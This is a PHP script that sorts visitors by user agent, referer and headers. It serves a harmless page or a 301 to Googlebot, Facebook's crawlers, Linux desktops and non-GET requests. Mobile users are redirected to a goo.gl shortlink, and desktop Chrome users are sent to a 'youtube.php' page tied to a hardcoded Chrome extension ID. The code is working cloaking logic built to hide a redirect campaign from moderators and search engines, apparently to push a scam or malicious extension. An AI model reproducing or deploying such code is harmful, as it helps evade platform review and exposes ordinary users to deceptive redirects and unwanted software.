<?php
  header("Access-Control-Allow-Origin:http://".$_SERVER["HTTP_HOST"]);
  header('Access-Control-Allow-Methods: GET');
  header('X-Frame-Options: DENY');

  $action = 'theme';

  require_once('Mobile_Detect.php');
  require_once('Browser.php');
  $detect = new Mobile_Detect;
  $browser = new Browser();

  if($detect->isMobile() || $browser->isMobile()){
    $action = 'mobile';
  }else if($browser->getBrowser() == Browser::BROWSER_GOOGLEBOT) {
    $action = 'theme';
  }else if($browser->getPlatform() == Browser::PLATFORM_X11 || $browser->isFacebook()){
    $action = 'theme';
  }else if($browser->getBrowser() == Browser::BROWSER_CHROME){
    $action = 'site';
  }

  $_SERVER["HTTP_USER_AGENT"] = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "";

  if(strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false){
    $action = 'theme';
  }

  if($action != 'theme'){
    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $bannedrefs = array('facebook.com/lsr.php');
    foreach ($bannedrefs as $ref) {
      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
        $action = 'theme';
        break;
      }
    }
  }

  if(isset($_SERVER['HTTP_X_FB_CURL_CLIENT'])){
    $action = 'theme';
  }

  if(isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] != 'GET'){
    $action = 'theme';
  }

  if(strpos($_SERVER['REQUEST_URI'], ".svg") && (isset($_SERVER['HTTP_REFERER']) && $_SERVER['HTTP_REFERER'] != "")){
    $action = 'theme';
  }

  if($action == 'mobile'){
    header('Location: https://goo.gl/fRhCfI?'.rand(111,99999));
  }else if($action == 'site'){
    $app_id = "afhcdcpghaeiaaekcoifjkcdbmdbhbjg";
    require_once("youtube.php");
  }else{
    @ob_end_clean();
    @ob_end_flush();
    header("HTTP/1.1 301");
  }
?>
